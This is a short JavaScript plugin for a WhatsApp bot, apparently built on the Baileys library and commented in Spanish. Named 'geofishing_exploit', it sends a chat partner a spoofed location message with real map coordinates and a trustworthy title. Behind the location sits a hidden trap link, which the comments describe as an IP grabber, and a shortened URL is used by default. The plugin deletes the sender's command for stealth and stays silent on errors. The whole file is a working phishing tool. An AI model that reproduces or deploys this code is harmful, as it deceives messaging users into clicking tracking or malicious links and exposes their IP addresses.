export default {
    name: 'geofishing_exploit',
    match: (text) => /^\.gps/i.test(text),
    execute: async ({ sock, remitente, msg, textoLimpio }) => {
        
        // Uso: .gps https://tu-link-trampa.com (grabber de IPs, rickroll, etc)
        const linkTrampa = textoLimpio.replace(/^\.gps\s*/i, '').trim() || "https://goo.su/OzNIU7";

        try {
            // Sigilo: borramos el comando de tu pantalla
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // EXPLOIT: Inyección del contenedor LocationMessage
            await sock.sendMessage(remitente, {
                location: {
                    // Coordenadas reales (Ej: Zona de Gran Canaria) para renderizar el mapa
                    degreesLatitude: 27.8440, 
                    degreesLongitude: -15.4385,
                    name: "Centro de Alto Rendimiento", // Título principal de confianza
                    address: "Ver ruta principal", // Subtítulo gris
                    url: linkTrampa // <--- El punto ciego de seguridad de Meta
                }
            });

        } catch (err) {
            console.error("Error en GPS Spoof:", err);
            // Sin alertas en el chat para mantener la limpieza
        }
    }
};
